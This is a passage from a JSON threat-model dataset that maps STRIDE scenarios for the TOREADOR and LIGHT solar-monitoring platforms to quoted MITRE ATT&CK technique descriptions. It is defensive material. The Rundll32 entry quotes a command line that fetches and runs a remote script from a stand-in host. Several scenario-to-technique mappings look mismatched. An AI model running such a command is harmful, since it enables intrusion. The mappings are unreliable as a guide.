                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to the TOREADOR platform and modifies stored data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can breach the platform's security.",
                    "Role": "Attacker",
                    "Condition": "Exploiting vulnerabilities or weak access controls."
                },
                {
                    "Assumption": "There are insufficient logging and monitoring mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust logging and monitoring."
                },
                {
                    "Assumption": "Data access controls are not tightly enforced.",
                    "Role": "System Developer",
                    "Condition": "Weak or improperly configured data access controls."
                }
            ],
            "Potential Impact": "Corrupts AI/ML model training data, leading to false predictions and compromised power optimization, affecting data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data",
                "Storage",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies configuration files on the Data Logger to alter the root-of-trust mechanism.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or privileged access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Gains physical access or escalates privilege to administrative level."
                },
                {
                    "Assumption": "The system does not have tamper-evident seals or notifications.",
                    "Role": "System Administrator",
                    "Condition": "Lack of physical security or integrity checks."
                },
                {
                    "Assumption": "Configuration files are not effectively protected.",
                    "Role": "System Developer",
                    "Condition": "Weak file permissions or inadequate protection mechanisms."
                }
            ],
            "Potential Impact": "Undermine system integrity leading to falsified data and inaccurate system decision-making.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Configuration",
                "Root-of-Trust",
                "Integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies having performed unauthorized access to the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have adequate logging and audit trails.",
                    "Role": "System Administrator",
                    "Condition": "Logs are either absent or not comprehensive."
                },
                {
                    "Assumption": "There is inadequate monitoring of user activities.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of user activity monitoring and anomaly detection."
                },
                {
                    "Assumption": "Multiple users share credentials.",
                    "Role": "Users",
                    "Condition": "Credential management and usage policy violations."
                }
            ],
            "Potential Impact": "Challenges in proving data breaches, affecting system integrity and potentially leading to policy enforcement issues.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Logging",
                "Auditing",
                "Authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user modifies system configurations in the Dashboard and denies doing so.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks robust logging for configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging of configuration modifications."
                },
                {
                    "Assumption": "User actions are not uniquely identifiable.",
                    "Role": "System Developer",
                    "Condition": "Absence of unique user session tracking."
                },
                {
                    "Assumption": "Audit logs are not tamper-proof.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be modified or deleted by users."
                }
            ],
            "Potential Impact": "System integrity comprises, operational impact, and difficulty in incident response and forensics.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Configuration",
                "Logging",
                "Session"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions on the Receiver component and denies any knowledge.",
            "Assumptions": [
                {
                    "Assumption": "Actions within the Receiver are not logged.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive logging within the Receiver component."
                },
                {
                    "Assumption": "The system does not employ non-repudiation controls.",
                    "Role": "System Developer",
                    "Condition": "Absence of mechanisms to confirm the source of actions."
                },
                {
                    "Assumption": "There is no real-time monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "No real-time detection or alerting of suspicious activities."
                }
            ],
            "Potential Impact": "Undermines incident investigation, impacts data integrity, and complicates accountability and trust.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Receiver",
                "Auditing",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmitted from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over an unsecured channel.",
                    "Role": "System Developer",
                    "Condition": "Transmission lacks encryption."
                },
                {
                    "Assumption": "The attacker can access the network between the Data Logger and Receiver.",
                    "Role": "Attacker",
                    "Condition": "Network security controls are bypassed or weak."
                },
                {
                    "Assumption": "Data Logger and Receiver communication do not employ end-to-end encryption.",
                    "Role": "System Developer",
                    "Condition": "Weak or absent end-to-end encryption."
                }
            ],
            "Potential Impact": "Leads to unauthorized data access, compromising data confidentiality and potentially revealing sensitive operational details.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Network",
                "Transmission",
                "Unencrypted"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive metadata related to solar power plants is exposed due to improper access controls in TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are poorly implemented or configured.",
                    "Role": "System Developer",
                    "Condition": "Permissions and access controls are inadequately managed."
                },
                {
                    "Assumption": "Metadata storage lacks encryption.",
                    "Role": "System Developer",
                    "Condition": "Metadata is stored in plaintext."
                },
                {
                    "Assumption": "There are no regular audits of access control policies.",
                    "Role": "System Administrator",
                    "Condition": "Access controls are not reviewed and audited periodically."
                }
            ],
            "Potential Impact": "Compromises data confidentiality and potentially sensitive information about operational and ownership details.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Metadata",
                "Access Control",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal system diagnostics logs are exposed to unauthorized users due to weak logging and monitoring mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Logs are accessible without strict access controls.",
                    "Role": "System Administrator",
                    "Condition": "Logs do not have proper access controls."
                },
                {
                    "Assumption": "The system lacks mechanisms to monitor and restrict log access.",
                    "Role": "System Developer",
                    "Condition": "Weak monitoring and access restrictions on logs."
                },
                {
                    "Assumption": "Diagnostic data is not adequately protected.",
                    "Role": "System Developer",
                    "Condition": "Critical system logs contain sensitive information and are insufficiently protected."
                }
            ],
            "Potential Impact": "Confidentiality breach could reveal system vulnerabilities or operational details.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Logs",
                "Access Control",
                "Monitoring"
            ],
            "mitre_technique": {
                "name": "Bash History",
                "description": "Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
                "id": "attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8",
                "technique_id": "T1139"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targets the TOREADOR platform, overwhelming it with traffic and disrupting access.",
            "Assumptions": [
                {
                    "Assumption": "The system is exposed to the internet without sufficient DDoS protections.",
                    "Role": "System Administrator",
                    "Condition": "Lacks DDoS mitigation solutions."
                },
                {
                    "Assumption": "Attackers can generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other large-scale traffic generation tools."
                },
                {
                    "Assumption": "The monitoring system cannot detect and respond to DDoS attacks in real-time.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient real-time monitoring and response mechanisms."
                }
            ],
            "Potential Impact": "Disrupts system availability, preventing data processing and access to the Dashboard.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Platform",
                "Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A targeted attack floods the Data Logger with malformed packets, causing it to crash or malfunction.",
            "Assumptions": [
                {
                    "Assumption": "The network does not filter harmful or malformed packets.",
                    "Role": "Network Administrator",
                    "Condition": "Lacks robust packet inspection and filtering mechanisms."
                },
                {
                    "Assumption": "The Data Logger lacks protections against malformed packets.",
                    "Role": "System Developer",
                    "Condition": "Insufficient input validation and error handling."
                },
                {
                    "Assumption": "The attacker can access the network segment where the Data Logger is located.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network segmentation and security controls."
                }
            ],
            "Potential Impact": "Data Logger becomes inoperative, causing data collection and transmission interruptions, affecting availability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malformed Packets",
                "Data Logger",
                "Network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker utilizes resource exhaustion tactics on the Receiver component, overwhelming its processing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can interact with the Receiver component.",
                    "Role": "Attacker",
                    "Condition": "Network access to the Receiver."
                },
                {
                    "Assumption": "The Receiver has inadequate resource management mechanisms.",
                    "Role": "System Developer",
                    "Condition": "Lack of rate limiting and resource isolation."
                },
                {
                    "Assumption": "The system does not have effective monitoring for resource utilization.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate resource usage monitoring."
                }
            ],
            "Potential Impact": "Prevents normal operation of the Receiver, causing delays or failures in data processing and affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Resource Exhaustion",
                "Receiver",
                "Processing"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the Data Logger to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Failure to apply timely patches and updates."
                },
                {
                    "Assumption": "The attacker can execute code on the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Gaining execution capabilities through physical or network access."
                },
                {
                    "Assumption": "Access controls do not restrict privilege escalation effectively.",
                    "Role": "System Developer",
                    "Condition": "Weak or misconfigured access control mechanisms."
                }
            ],
            "Potential Impact": "Gains unauthorized control over the Data Logger, allowing manipulation of data and disruption of data collection processes.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Vulnerability",
                "Root Access",
                "Data Logger"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the TOREADOR platform to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The system is vulnerable to zero-day exploits.",
                    "Role": "System Administrator",
                    "Condition": "Lack of protections against novel and unknown threats."
                },
                {
                    "Assumption": "The security mechanisms for privilege escalation are weak or compromised.",
                    "Role": "System Developer",
                    "Condition": "Inadequate privilege escalation protection mechanisms."
                },
                {
                    "Assumption": "No real-time security monitoring for zero-day attack patterns.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of sophisticated threat detection systems."
                }
            ],
            "Potential Impact": "Provides unauthorized access to core systems, compromising data integrity and system control.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Zero-day",
                "Administrative Privileges",
                "TOREADOR"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Through social engineering, an attacker convinces an employee to install malware that enables the attacker to escalate privileges within the LIGHT platform.",
            "Assumptions": [
                {
                    "Assumption": "Employees are susceptible to phishing and social engineering attacks.",
                    "Role": "Employees",
                    "Condition": "Lack of training and awareness."
                },
                {
                    "Assumption": "The platform does not employ robust endpoint protection.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive endpoint protection solutions."
                },
                {
                    "Assumption": "There are no multi-layered security mechanisms to prevent privilege escalation on compromised endpoints.",
                    "Role": "System Developer",
                    "Condition": "Single points of failure with weak deterrence against privilege escalation."
                }
            ],
            "Potential Impact": "Enables unauthorized access to critical system controls, impacting data integrity and overall system security.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Social Engineering",
                "Malware",
                "LIGHT Platform"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the data logger by presenting false network credentials to gain access to sensor data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network.",
                    "Role": "Network Attacker",
                    "Condition": "Physical or remote access to the relevant network is available."
                },
                {
                    "Assumption": "Authentication between the data logger and the receiver is not properly validated.",
                    "Role": "System Designer",
                    "Condition": "Lack of strict authentication protocols."
                },
                {
                    "Assumption": "The attacker can intercept or mimic network traffic.",
                    "Role": "Network Attacker",
                    "Condition": "Access to network traffic for sniffing or injecting malicious packets."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensor data, data integrity compromised, and disruption in system operations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data logger",
                "network",
                "credentials"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
